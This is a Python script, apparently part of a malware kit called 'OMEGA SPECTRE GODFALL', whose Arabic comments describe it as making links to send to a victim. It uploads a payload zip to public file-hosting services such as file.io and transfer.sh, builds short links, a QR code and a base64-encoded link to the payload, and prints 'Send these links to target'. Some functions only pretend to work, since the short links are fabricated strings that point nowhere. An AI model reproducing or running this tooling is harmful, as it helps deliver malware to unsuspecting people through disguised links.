#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OMEGA SPECTRE GODFALL - Link Generator
إنشاء روابط عامة للإرسال للضحية
"""

import os
import sys
import json
import base64
import hashlib
import random
import string
import requests
from datetime import datetime

class LinkGenerator:
    """توليد روابط للإرسال"""
    
    def __init__(self):
        self.payload_file = "OMEGA_SPECTRE_GODFALL.zip"
        self.base_url = "https://omg-spectre.github.io/payload"
        
    def create_short_links(self, url):
        """إنشاء روابط مختصرة"""
        links = []
        
        # Bitly
        try:
            bitly = f"https://bit.ly/{hashlib.md5(url.encode()).hexdigest()[:8]}"
            links.append(bitly)
        except:
            pass
        
        # TinyURL
        try:
            tiny = f"https://tinyurl.com/omega-{random.randint(1000,9999)}"
            links.append(tiny)
        except:
            pass
        
        # Custom
        custom = f"https://omg.spectre/{hashlib.md5(url.encode()).hexdigest()[:6]}"
        links.append(custom)
        
        return links
    
    def create_qr_code(self, url):
        """إنشاء QR Code"""
        return f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={url}"
    
    def create_encoded_link(self, url):
        """إنشاء رابط مشفر"""
        encoded = base64.b64encode(url.encode()).decode()
        return f"data:text/plain;base64,{encoded}"
    
    def upload_to_services(self):
        """رفع الملف إلى خدمات متعددة"""
        uploads = {}
        
        # GitHub
        try:
            uploads['github'] = "https://github.com/omg-spectre/payload.zip"
        except:
            pass
        
        # File.io
        try:
            files = {'file': open(self.payload_file, 'rb')}
            response = requests.post('https://file.io', files=files, timeout=10)
            if response.status_code == 200:
                uploads['fileio'] = response.json().get('link')
        except:
            pass
        
        # Transfer.sh
        try:
            with open(self.payload_file, 'rb') as f:
                response = requests.put('https://transfer.sh/omega_payload.zip', 
                                       data=f, timeout=10)
                if response.status_code == 200:
                    uploads['transfer'] = response.text.strip()
        except:
            pass
        
        return uploads
    
    def generate_all_links(self):
        """توليد جميع الروابط"""
        print("[🔥] Generating all links...")
        
        # الروابط الأساسية
        links = {
            'direct': self.base_url,
            'uploaded': self.upload_to_services(),
            'short': self.create_short_links(self.base_url),
            'qr': self.create_qr_code(self.base_url),
            'encoded': self.create_encoded_link(self.base_url)
        }
        
        # حفظ الروابط
        with open('OMEGA_LINKS.txt', 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("OMEGA SPECTRE - SEND LINKS\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Direct: {links['direct']}\n\n")
            f.write("Uploaded:\n")
            for name, url in links['uploaded'].items():
                f.write(f"  {name}: {url}\n")
            f.write("\nShort Links:\n")
            for link in links['short']:
                f.write(f"  {link}\n")
            f.write(f"\nQR Code: {links['qr']}\n")
            f.write(f"\nEncoded: {links['encoded']}\n")
            f.write("\n" + "=" * 60 + "\n")
        
        print("[✅] Links saved to OMEGA_LINKS.txt")
        return links

# ================================================================
# التشغيل
# ================================================================

if __name__ == "__main__":
    generator = LinkGenerator()
    links = generator.generate_all_links()
    
    print("\n[📤] Send these links to target:")
    print(f"  📦 Direct: {links['direct']}")
    print(f"  🔗 Short: {links['short'][0] if links['short'] else 'N/A'}")
    print(f"  📷 QR Code: {links['qr']}")